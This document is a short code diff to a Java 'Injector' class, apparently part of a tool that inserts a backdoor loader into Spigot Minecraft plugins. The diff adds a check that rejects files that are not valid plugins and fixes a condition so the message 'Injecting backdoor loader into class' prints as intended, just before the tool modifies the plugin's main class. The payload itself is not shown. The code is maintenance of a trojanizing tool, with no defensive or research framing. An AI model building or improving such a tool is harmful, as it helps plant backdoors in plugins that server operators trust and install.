@@ -80,6 +80,14 @@ public class Injector {
         }
 
         Map<String, Object> pluginYAML = readPluginYAML(input.toAbsolutePath().toString());
+
+        if(pluginYAML == null){
+            if(print_msg) {
+                System.out.println("[Injector] Not a valid spigot plugin: " + input.getFileName() + "\n" + input.toAbsolutePath());
+            }
+            return false;
+        }
+        
         String name = (String) pluginYAML.get("name");
         String mainClass = (String) pluginYAML.get("main");
 
@@ -166,7 +174,7 @@ public class Injector {
 
             //Get main class, and find onEnable method
 
-            if(!print_msg)
+            if(print_msg)
                 System.out.println("[Injector] Injecting backdoor loader into class.");
 
             CtClass cc = pool.get(mainClass);
